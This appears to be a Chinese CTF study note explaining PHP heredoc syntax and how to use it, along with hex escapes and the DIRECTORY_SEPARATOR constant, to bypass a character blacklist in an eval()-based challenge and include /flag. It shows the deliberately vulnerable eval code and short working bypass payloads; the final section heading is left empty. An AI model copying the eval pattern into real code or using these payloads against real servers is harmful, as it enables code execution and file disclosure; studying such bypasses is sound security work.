# php EOF(heredos)
## 介绍
先复制一段官方的介绍：
**在 PHP 中，heredoc 是一种用来表示长字符串的语法结构，它允许你创建包含多行文本的字符串而无需使用引号或转义特殊字符。heredoc 结构以 <<< 开始，后跟一个标识符（通常是任意的字母、数字或下划线组成的字符串），并且以相同的标识符结束。标识符必须在行的起始位置，并且后面不能有任何空格或其他字符。**
e.g.：
```php
$variable = <<<EOT

This is a heredoc string.

It can span multiple lines.

You can include variables like $name within it.

EOT;

echo $variable;
```
内容可以包含多行 可以包含变量 $var 可以包含 "双引号" 和 '单引号'
## 使用例
```php
<?php
        if (isset($_GET['input'])) {
            echo '<div class="output">';

            $filtered = str_replace(['$', '(', ')', '`', '"', "'", "+", ":", "/", "!", "?"], '', $_GET['input']);
            $cmd = $filtered . '();';
            
            echo '<strong>After Security Filtering:</strong> <span class="filtered">' . htmlspecialchars($cmd) . '</span>' . "\n\n";
                        
            try {
                ob_start();
                eval($cmd);
                $result = ob_get_clean();
                
                if (!empty($result)) {
                    echo htmlspecialchars($result);
                } else {
                    echo '<span class="success">✅ Function executed (no output)</span>';
                }
            } catch (Error $e) {
                echo '<span class="error">❌ Error: ' . htmlspecialchars($e->getMessage()) . '</span>';
            } catch (Exception $e) {
                echo '<span class="error">❌ Exception: ' . htmlspecialchars($e->getMessage()) . '</span>';
            }
            
            echo '</div>';
            echo '</div>';
        }
        ?>
```
ban掉括号无法使用函数，不过类似于`include`,`echo`,`require`的语言结构是可以用的，因此可以用include "xxx"。另外heredos支持十六进制转换，因此可以用十六进制绕过"/"
```php
\057 ---> /   八进制
\x2f ---> /   十六进制
```
```
include <<<p
/flag
p;
============================
include%20<<<p%0a/flag%0ap;
注意<<<p下一行要顶格写
```
最终payload:
```
include%20<<<p%0a\x2fflag%0ap;
```
# 预定义常量绕过"/"
## DIRECTORY_SEPARATOR
DIRECTORY_SEPARATOR 是一个 PHP 的预定义常量。它的值是当前服务器操作系统所使用的目录分隔符。在 Linux 和 macOS 系统上，它的值就是 /；在 Windows 系统上，它的值是 \。
像上一道题可以用DIRECTORY_SEPARATOR.flag来表示`/flag`,中间.可作为连接
payload:`@include DIRECTORY_SEPARATOR.flag;#`
## PHP_BINARY
